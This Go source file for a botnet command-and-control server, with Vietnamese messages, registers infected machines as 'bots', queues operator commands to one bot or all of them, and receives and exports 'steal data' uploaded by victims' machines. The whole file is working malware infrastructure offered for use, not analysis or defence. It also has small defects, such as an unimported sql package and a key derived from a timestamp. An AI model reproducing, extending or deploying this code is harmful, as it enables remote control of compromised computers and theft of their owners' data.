package main

import (
    "encoding/hex"
    "encoding/json"
    "log"
    "net/http"
    "strings"
    "sync"
    "time"

    "github.com/gin-gonic/gin"
)

type RateLimiter struct {
    mu       sync.Mutex
    requests map[string][]time.Time
}

var limiter = &RateLimiter{requests: make(map[string][]time.Time)}

func (rl *RateLimiter) IsAllowed(ip string) bool {
    rl.mu.Lock()
    defer rl.mu.Unlock()
    now := time.Now()
    windowStart := now.Add(-1 * time.Minute)
    var recent []time.Time
    for _, t := range rl.requests[ip] {
        if t.After(windowStart) {
            recent = append(recent, t)
        }
    }
    rl.requests[ip] = recent
    if len(recent) >= AppConfig.RateLimitMax {
        return false
    }
    rl.requests[ip] = append(rl.requests[ip], now)
    return true
}

func (rl *RateLimiter) Cleanup() {
    rl.mu.Lock()
    defer rl.mu.Unlock()
    now := time.Now()
    windowStart := now.Add(-5 * time.Minute)
    for ip, times := range rl.requests {
        var recent []time.Time
        for _, t := range times {
            if t.After(windowStart) {
                recent = append(recent, t)
            }
        }
        if len(recent) == 0 {
            delete(rl.requests, ip)
        } else {
            rl.requests[ip] = recent
        }
    }
}

func CORSMiddleware() gin.HandlerFunc {
    return func(c *gin.Context) {
        c.Header("Access-Control-Allow-Origin", "*")
        c.Header("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE, OPTIONS")
        c.Header("Access-Control-Allow-Headers", "Origin, Content-Type, Authorization, X-Bot-ID, X-Encryption-Key")
        c.Header("Access-Control-Max-Age", "86400")
        if c.Request.Method == "OPTIONS" {
            c.AbortWithStatus(http.StatusNoContent)
            return
        }
        c.Next()
    }
}

func JWTAuthMiddleware() gin.HandlerFunc {
    return func(c *gin.Context) {
        authHeader := c.GetHeader("Authorization")
        if authHeader == "" {
            c.JSON(http.StatusUnauthorized, APIResponse{Success: false, Message: "Thieu header Authorization"})
            c.Abort()
            return
        }
        tokenString := strings.TrimPrefix(authHeader, "Bearer ")
        if tokenString == authHeader {
            c.JSON(http.StatusUnauthorized, APIResponse{Success: false, Message: "Header Authorization khong hop le"})
            c.Abort()
            return
        }
        claims, err := ValidateJWT(tokenString)
        if err != nil {
            c.JSON(http.StatusUnauthorized, APIResponse{Success: false, Message: "Token khong hop le hoac da het han"})
            c.Abort()
            return
        }
        c.Set("username", (*claims)["username"])
        c.Next()
    }
}

func RateLimitMiddleware() gin.HandlerFunc {
    return func(c *gin.Context) {
        ip := c.ClientIP()
        if !limiter.IsAllowed(ip) {
            c.JSON(http.StatusTooManyRequests, APIResponse{Success: false, Message: "Qua nhieu request"})
            c.Abort()
            return
        }
        c.Next()
    }
}

func HandleRegister(c *gin.Context) {
    var req RegisterRequest
    if err := c.ShouldBindJSON(&req); err != nil {
        c.JSON(http.StatusBadRequest, APIResponse{Success: false, Message: "Du lieu dang ky khong hop le"})
        return
    }
    botID := GenerateUUID()
    ip := c.ClientIP()
    now := time.Now()
    bot := &Bot{
        ID: botID, Hostname: req.Hostname, OS: req.OS, IP: ip,
        Country: "Unknown", FirstSeen: now, LastSeen: now, Status: "online",
        CPU: req.CPU, RAM: req.RAM, GPU: req.GPU, Disk: req.Disk,
        LocalIP: req.LocalIP, Arch: req.Arch, Admin: req.Admin,
    }
    err := AddBot(bot)
    if err != nil {
        c.JSON(http.StatusInternalServerError, APIResponse{Success: false, Message: "Loi luu bot: " + err.Error()})
        return
    }
    botEncryptionKey := make([]byte, 32)
    for i := 0; i < 32; i++ {
        botEncryptionKey[i] = byte(time.Now().UnixNano()>>(i%8)) ^ byte(i*7)
    }
    serverKeyBytes, _ := hex.DecodeString(AppConfig.EncryptionKey)
    encryptedBotKey, _ := EncryptAESGCM(botEncryptionKey, serverKeyBytes)
    c.JSON(http.StatusOK, APIResponse{Success: true, Message: "Dang ky thanh cong", Data: gin.H{"bot_id": botID, "encryption_key": encryptedBotKey}})
    log.Printf("[REGISTER] Bot moi: %s - %s (%s)", botID, req.Hostname, req.OS)
}

func HandleCheckin(c *gin.Context) {
    botID := c.GetHeader("X-Bot-ID")
    if botID == "" {
        var body map[string]interface{}
        c.ShouldBindJSON(&body)
        if bid, ok := body["bot_id"].(string); ok { botID = bid }
    }
    if botID == "" {
        c.JSON(http.StatusBadRequest, APIResponse{Success: false, Message: "Thieu Bot ID"})
        return
    }
    ip := c.ClientIP()
    UpdateBotCheckin(botID, ip)
    commands, _ := GetCommands(botID, "pending", 10)
    for _, cmd := range commands {
        UpdateCommandResult(cmd.ID, "executing", "")
    }
    c.JSON(http.StatusOK, APIResponse{Success: true, Data: gin.H{"commands": commands}})
}

func HandleResult(c *gin.Context) {
    botID := c.GetHeader("X-Bot-ID")
    var result map[string]interface{}
    if err := c.ShouldBindJSON(&result); err != nil {
        c.JSON(http.StatusBadRequest, APIResponse{Success: false, Message: "Du lieu ket qua khong hop le"})
        return
    }
    cmdID, _ := result["command_id"].(string)
    status, _ := result["status"].(string)
    resStr, _ := result["result"].(string)
    if cmdID == "" {
        c.JSON(http.StatusBadRequest, APIResponse{Success: false, Message: "Thieu command_id"})
        return
    }
    UpdateCommandResult(cmdID, status, resStr)
    BroadcastToAdmins(WSMessage{Type: "command_result", BotID: botID, CommandID: cmdID, Result: resStr, Timestamp: time.Now().Unix()})
    c.JSON(http.StatusOK, APIResponse{Success: true, Message: "Da nhan ket qua"})
}

func HandleSteal(c *gin.Context) {
    botID := c.GetHeader("X-Bot-ID")
    if botID == "" {
        var body map[string]interface{}
        c.ShouldBindJSON(&body)
        if bid, ok := body["bot_id"].(string); ok { botID = bid }
    }
    var stealReq struct {
        DataType string `json:"data_type"`
        Data     string `json:"data"`
    }
    if err := c.ShouldBindJSON(&stealReq); err != nil {
        c.JSON(http.StatusBadRequest, APIResponse{Success: false, Message: "Du lieu steal khong hop le"})
        return
    }
    SaveStealData(botID, stealReq.DataType, stealReq.Data)
    BroadcastToAdmins(WSMessage{Type: "new_steal", BotID: botID, Module: stealReq.DataType, Timestamp: time.Now().Unix()})
    c.JSON(http.StatusOK, APIResponse{Success: true, Message: "Da nhan du lieu steal"})
}

func HandleLogin(c *gin.Context) {
    var req LoginRequest
    if err := c.ShouldBindJSON(&req); err != nil {
        c.JSON(http.StatusBadRequest, APIResponse{Success: false, Message: "Du lieu dang nhap khong hop le"})
        return
    }
    user, err := GetUserByUsername(req.Username)
    if err != nil || !CheckPassword(req.Password, user.PasswordHash) {
        c.JSON(http.StatusUnauthorized, APIResponse{Success: false, Message: "Sai username hoac mat khau"})
        return
    }
    token, _ := CreateJWT(req.Username)
    UpdateUserToken(req.Username, token)
    c.JSON(http.StatusOK, APIResponse{Success: true, Message: "Dang nhap thanh cong", Data: gin.H{"token": token}})
}

func HandleGetBots(c *gin.Context) {
    status := c.Query("status")
    country := c.Query("country")
    search := c.Query("search")
    bots, err := GetBots(status, country, search, 200, 0)
    if err != nil {
        c.JSON(http.StatusInternalServerError, APIResponse{Success: false, Message: "Loi: " + err.Error()})
        return
    }
    c.JSON(http.StatusOK, APIResponse{Success: true, Data: gin.H{"bots": bots, "count": len(bots)}})
}

func HandleGetBotDetail(c *gin.Context) {
    botID := c.Param("id")
    bot, err := GetBotByID(botID)
    if err != nil {
        c.JSON(http.StatusNotFound, APIResponse{Success: false, Message: "Khong tim thay bot"})
        return
    }
    commands, _ := GetCommands(botID, "", 50)
    c.JSON(http.StatusOK, APIResponse{Success: true, Data: gin.H{"bot": bot, "recent_commands": commands}})
}

func HandleSendCommand(c *gin.Context) {
    var req CommandRequest
    if err := c.ShouldBindJSON(&req); err != nil {
        c.JSON(http.StatusBadRequest, APIResponse{Success: false, Message: "Du lieu lenh khong hop le"})
        return
    }
    if req.BotID == "all" || req.BotID == "*" {
        onlineBots, _ := GetBots("online", "", "", 0, 0)
        var ids []string
        for _, bot := range onlineBots {
            cmd := &Command{ID: GenerateUUID(), BotID: bot.ID, Module: req.Module, Action: req.Action, Params: req.Params, Status: "pending", CreatedAt: time.Now(), UpdatedAt: time.Now()}
            AddCommand(cmd)
            ids = append(ids, cmd.ID)
        }
        c.JSON(http.StatusOK, APIResponse{Success: true, Message: "Da gui lenh den tat ca bot online", Data: gin.H{"command_ids": ids, "bot_count": len(onlineBots)}})
        return
    }
    cmd := &Command{ID: GenerateUUID(), BotID: req.BotID, Module: req.Module, Action: req.Action, Params: req.Params, Status: "pending", CreatedAt: time.Now(), UpdatedAt: time.Now()}
    AddCommand(cmd)
    BroadcastCommandToBot(cmd)
    c.JSON(http.StatusOK, APIResponse{Success: true, Message: "Da gui lenh", Data: gin.H{"command_id": cmd.ID}})
}

func HandleGetCommands(c *gin.Context) {
    botID := c.Query("bot_id")
    status := c.Query("status")
    commands, _ := GetCommands(botID, status, 200)
    c.JSON(http.StatusOK, APIResponse{Success: true, Data: gin.H{"commands": commands, "count": len(commands)}})
}

func HandleGetSteals(c *gin.Context) {
    botID := c.Query("bot_id")
    dataType := c.Query("data_type")
    steals, _ := GetStealData(botID, dataType, 200)
    c.JSON(http.StatusOK, APIResponse{Success: true, Data: gin.H{"steals": steals, "count": len(steals)}})
}

func HandleGetStats(c *gin.Context) {
    stats, _ := GetStats()
    c.JSON(http.StatusOK, APIResponse{Success: true, Data: stats})
}

func HandleHealthCheck(c *gin.Context) {
    c.JSON(http.StatusOK, APIResponse{Success: true, Message: "C2 Server dang hoat dong", Data: gin.H{"timestamp": time.Now().Unix(), "version": "1.0.0"}})
}

func HandleDeleteBot(c *gin.Context) {
    botID := c.Param("id")
    DB.Exec("DELETE FROM bots WHERE id = ?", botID)
    DB.Exec("DELETE FROM commands WHERE bot_id = ?", botID)
    DB.Exec("DELETE FROM steal_data WHERE bot_id = ?", botID)
    c.JSON(http.StatusOK, APIResponse{Success: true, Message: "Bot da xoa"})
}

func HandleExportSteals(c *gin.Context) {
    dataType := c.Query("data_type")
    var rows *sql.Rows
    var err error
    if dataType != "" {
        rows, err = DB.Query("SELECT bot_id, data_type, data, timestamp FROM steal_data WHERE data_type = ? ORDER BY timestamp DESC", dataType)
    } else {
        rows, err = DB.Query("SELECT bot_id, data_type, data, timestamp FROM steal_data ORDER BY timestamp DESC")
    }
    if err != nil {
        c.JSON(http.StatusInternalServerError, APIResponse{Success: false, Message: "Loi truy van"})
        return
    }
    defer rows.Close()
    var output strings.Builder
    output.WriteString("=== C2 BOTNET STEAL DATA EXPORT ===\n\n")
    for rows.Next() {
        var botID, dt, data, ts string
        rows.Scan(&botID, &dt, &data, &ts)
        output.WriteString("--- " + dt + " ---\n")
        output.WriteString("Bot: " + botID + "\n")
        output.WriteString("Time: " + ts + "\n")
        var prettyJSON map[string]interface{}
        if json.Unmarshal([]byte(data), &prettyJSON) == nil {
            formatted, _ := json.MarshalIndent(prettyJSON, "", "  ")
            output.WriteString(string(formatted) + "\n\n")
        } else {
            output.WriteString(data + "\n\n")
        }
    }
    c.Header("Content-Type", "text/plain")
    c.Header("Content-Disposition", "attachment; filename=steal_data.txt")
    c.String(http.StatusOK, output.String())
}

func HandleCleanupBots(c *gin.Context) {
    DB.Exec("DELETE FROM commands")
    DB.Exec("DELETE FROM steal_data")
    DB.Exec("DELETE FROM bots")
    c.JSON(http.StatusOK, APIResponse{Success: true, Message: "Da xoa toan bo du lieu"})
}
